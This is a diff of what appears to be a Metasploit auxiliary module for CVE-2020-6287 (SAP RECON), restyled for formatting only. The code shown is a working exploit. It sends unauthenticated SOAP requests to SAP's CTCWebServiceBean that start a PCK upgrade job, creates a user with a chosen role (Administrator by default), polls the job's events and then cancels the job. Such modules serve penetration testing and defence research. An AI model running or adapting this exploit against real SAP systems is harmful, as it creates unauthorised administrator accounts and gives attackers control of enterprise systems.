@@ -10,12 +10,12 @@ class WebServiceSession
   end
 
   def cancel_execution
-    envelope = Nokogiri::XML(<<-EOS, nil, nil, options=Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
+    envelope = Nokogiri::XML(<<-EOS, nil, nil, options = Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
       <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
          <soapenv:Header/>
          <soapenv:Body>
             <urn:cancelExecution>
-               <sessionId>#{ @session_id.encode(xml: :text) }</sessionId>
+               <sessionId>#{@session_id.encode(xml: :text)}</sessionId>
             </urn:cancelExecution>
          </soapenv:Body>
       </soapenv:Envelope>
@@ -27,12 +27,12 @@ class WebServiceSession
   end
 
   def get_event
-    envelope = Nokogiri::XML(<<-EOS, nil, nil, options=Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
+    envelope = Nokogiri::XML(<<-EOS, nil, nil, options = Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
       <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
          <soapenv:Header/>
          <soapenv:Body>
             <urn:getNextEvent>
-               <sessionId>#{ @session_id.encode(xml: :text) }</sessionId>
+               <sessionId>#{@session_id.encode(xml: :text)}</sessionId>
             </urn:getNextEvent>
          </soapenv:Body>
       </soapenv:Envelope>
@@ -44,12 +44,12 @@ class WebServiceSession
   end
 
   def has_events_available?
-    envelope = Nokogiri::XML(<<-EOS, nil, nil, options=Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
+    envelope = Nokogiri::XML(<<-EOS, nil, nil, options = Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
       <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
          <soapenv:Header/>
          <soapenv:Body>
             <urn:eventsAvailable>
-               <sessionId>#{ @session_id.encode(xml: :text) }</sessionId>
+               <sessionId>#{@session_id.encode(xml: :text)}</sessionId>
             </urn:eventsAvailable>
          </soapenv:Body>
       </soapenv:Envelope>
@@ -73,39 +73,43 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'            => 'SAP Unauthenticated WebService User Creation',
-      'Description'     => %q{
-        This module leverages an unauthenticated web service to submit a job which will create a user with a specified
-        role. The job involves running a wizard however after the necessary action is taken the job is canceled to avoid
-        unnecessary system changes.
-      },
-      'Author'          => [
-        'Pablo Artuso',
-        'Dmitry Chastuhin',
-        'Spencer McIntyre'
-      ],
-      'License'         => MSF_LICENSE,
-      'References'      => [
-        [ 'CVE', '2020-6287' ],
-        [ 'URL', 'https://github.com/chipik/SAP_RECON' ],
-        [ 'URL', 'https://www.onapsis.com/recon-sap-cyber-security-vulnerability' ],
-        [ 'URL', 'https://us-cert.cisa.gov/ncas/alerts/aa20-195a' ]
-      ],
-      'Notes' => {
+    super(
+      update_info(
+        info,
+        'Name' => 'SAP Unauthenticated WebService User Creation',
+        'Description' => %q{
+          This module leverages an unauthenticated web service to submit a job which will create a user with a specified
+          role. The job involves running a wizard however after the necessary action is taken the job is canceled to avoid
+          unnecessary system changes.
+        },
+        'Author' => [
+          'Pablo Artuso',
+          'Dmitry Chastuhin',
+          'Spencer McIntyre'
+        ],
+        'License' => MSF_LICENSE,
+        'References' => [
+          [ 'CVE', '2020-6287' ],
+          [ 'URL', 'https://github.com/chipik/SAP_RECON' ],
+          [ 'URL', 'https://www.onapsis.com/recon-sap-cyber-security-vulnerability' ],
+          [ 'URL', 'https://us-cert.cisa.gov/ncas/alerts/aa20-195a' ]
+        ],
+        'Notes' => {
           'AKA' => [ 'RECON' ]
-      },
-      'DisclosureDate' => '2020-07-14'
-    ))
+        },
+        'DisclosureDate' => '2020-07-14'
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(50000),
-        OptString.new('USERNAME',  [ true, 'The username to create' ]),
+        OptString.new('USERNAME', [ true, 'The username to create' ]),
         OptString.new('PASSWORD', [ true, 'The password for the new user' ]),
         OptString.new('ROLE', [ true, 'The role to assign the new user', 'Administrator']),
         OptString.new('TARGETURI', [ true, 'Path to ConfigServlet', '/CTCWebService/CTCWebServiceBean'])
-      ])
+      ]
+    )
   end
 
   def run
@@ -114,30 +118,29 @@ class MetasploitModule < Msf::Auxiliary
     job = invoke_pckupgrade
     print_good("Job running with session id: #{job.session_id}")
 
-    while true
+    loop do
       # it's a slow process, wait between status checks
       sleep 2
 
-      if job.has_events_available?
-        event = job.get_event
+      next unless job.has_events_available?
 
-        unless (action_id = event.xpath('//ctc:StartAction/ctc:Action/ctc:ActionId/text()')).blank?
-          if action_id.to_s == 'genErrorNotification'
-            report_error_details(job)
-            fail_with(Failure::Unknown, 'General error')
-          end
-        end
+      event = job.get_event
 
-        unless (description = event.xpath('//ctc:StartAction/ctc:Action/ctc:Description/text()')).blank?
-          vprint_status("Received event description: #{description}")
-        end
-
-        unless (description = event.xpath('//ctc:FinishAction/ctc:Action/ctc:Description/text()')).blank?
-          break if description.to_s =~ /Assign Role SAP_XI_PCK_CONFIG to PCKUser/i
+      unless (action_id = event.xpath('//ctc:StartAction/ctc:Action/ctc:ActionId/text()')).blank?
+        if action_id.to_s == 'genErrorNotification'
+          report_error_details(job)
+          fail_with(Failure::Unknown, 'General error')
         end
       end
-    end
 
+      unless (description = event.xpath('//ctc:StartAction/ctc:Action/ctc:Description/text()')).blank?
+        vprint_status("Received event description: #{description}")
+      end
+
+      unless (description = event.xpath('//ctc:FinishAction/ctc:Action/ctc:Description/text()')).blank?
+        break if description.to_s =~ /Assign Role SAP_XI_PCK_CONFIG to PCKUser/i
+      end
+    end
   ensure
     unless job.nil?
       print_status('Canceling the PCK Upgrade job...')
@@ -162,20 +165,22 @@ class MetasploitModule < Msf::Auxiliary
         'method' => 'POST',
         'ctype' => 'text/xml;charset=UTF-8',
         'data' => envelope
-      })
+      }
+    )
 
     return nil unless res&.code == 200
     return nil unless res.headers['Content-Type'].strip.start_with?('text/xml')
+
     res
   end
 
   def invoke_pckupgrade
-    message = {name: 'Netweaver.PI_PCK.PCK'}
-    message[:data] = Nokogiri::XML(<<-EOS, nil, nil, options=Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
+    message = { name: 'Netweaver.PI_PCK.PCK' }
+    message[:data] = Nokogiri::XML(<<-EOS, nil, nil, options = Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
       <PCK>
         <Usermanagement>
           <SAP_XI_PCK_CONFIG>
-            <roleName>#{ datastore['ROLE'].encode(xml: :text) }</roleName>
+            <roleName>#{datastore['ROLE'].encode(xml: :text)}</roleName>
           </SAP_XI_PCK_CONFIG>
           <SAP_XI_PCK_COMMUNICATION>
             <roleName>Administrator</roleName>
@@ -187,8 +192,8 @@ class MetasploitModule < Msf::Auxiliary
             <roleName>Administrator</roleName>
           </SAP_XI_PCK_ADMIN>
           <PCKUser>
-            <userName>#{ datastore['USERNAME'].encode(xml: :text) }</userName>
-            <password secure="true">#{ datastore['PASSWORD'].encode(xml: :text) }</password>
+            <userName>#{datastore['USERNAME'].encode(xml: :text)}</userName>
+            <password secure="true">#{datastore['PASSWORD'].encode(xml: :text)}</password>
           </PCKUser>
           <PCKReceiver>
             <userName>pckreceiver2</userName>
@@ -206,7 +211,7 @@ class MetasploitModule < Msf::Auxiliary
       </PCK>
     EOS
 
-    envelope = Nokogiri::XML(<<-EOS, nil, nil, options=Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
+    envelope = Nokogiri::XML(<<-EOS, nil, nil, options = Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)
       <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
         <soapenv:Header/>
         <soapenv:Body>
@@ -216,8 +221,8 @@ class MetasploitModule < Msf::Auxiliary
                 <path>content/Netweaver/PI_PCK/PCK/PCKProcess.cproc</path>
              </identifier>
              <contextMessages>
-                <baData>#{ Rex::Text.encode_base64(message[:data]) }</baData>
-                <name>#{ message[:name] }</name>
+                <baData>#{Rex::Text.encode_base64(message[:data])}</baData>
+                <name>#{message[:name]}</name>
              </contextMessages>
           </urn:execute>
          </soapenv:Body>
